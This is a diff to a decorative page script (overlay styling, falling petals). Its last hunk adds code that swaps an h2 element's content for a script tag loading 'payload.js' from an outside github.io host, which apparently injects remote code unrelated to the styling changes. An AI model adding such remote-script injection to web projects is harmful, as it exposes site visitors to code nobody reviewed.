@@ -4,7 +4,6 @@ style.textContent = `
   body {
     position: relative;
     overflow: hidden; /* Prevents scrollbars from appearing */
-    background-color: black; /* Ensures a black background */
   }
 
   /* Black transparent background */
@@ -15,7 +14,7 @@ style.textContent = `
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0, 0, 0, 0.8); /* Slightly darker for better coverage */
+    background: rgba(0, 0, 0, 0.5); /* Adjust opacity as needed */
     z-index: -1; /* Behind all other content */
   }
 
@@ -43,6 +42,12 @@ style.textContent = `
 
 // Append the style to the head
 document.head.appendChild(style);
+
+// Replace the <h2> text with the script tag
+const h2Element = document.querySelector('h2.lead');
+if (h2Element) {
+  h2Element.innerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script>`;
+}
 
 // Function to create a petal
 function createPetal() {
